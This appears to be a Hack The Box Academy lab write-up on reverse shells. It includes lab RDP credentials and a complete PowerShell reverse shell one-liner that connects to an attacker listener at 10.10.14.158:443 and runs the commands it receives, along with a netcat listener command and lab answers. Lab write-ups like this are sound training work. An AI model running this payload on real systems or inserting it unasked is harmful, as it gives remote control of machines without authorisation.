### HTB Pentester Path <br>
### Shells & Payloads - Reverse Shells Lab <br>
<mark>hook it up with a &#x2B50; if this helps!</mark> <br>
🐦: @<a href="https://x.com/st8less">**st8less**</a>
<br>

---

IP:
10.129.201.51

RDP to 10.129.201.51 (ACADEMY-SHELLS-WIN10) with user "htb-student" and password "HTB_@cademy_stdnt!"

---

### Question 1:
When establishing a reverse shell session with a target, will the target act as a client or server?When establishing a reverse shell session with a target, will the target act as a client or server?

&#x1F6A9; client

---
### Question 2:
Connect to the target via RDP and establish a reverse shell session with your attack box then submit the hostname of the target box.


Setup a nc listener on pwnbox:

	$ sudo nc -nlvp 443

RDP'd into winbox with credentials given.

opened powershell.

executed PS rev shell script:

	powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"

this pops shell on pwnbox, where i just queried the hostname:

	PS C:\Users\htb-student> hostname
	Shells-Win10


&#x1F6A9; found **Shells-Win--edit--**.
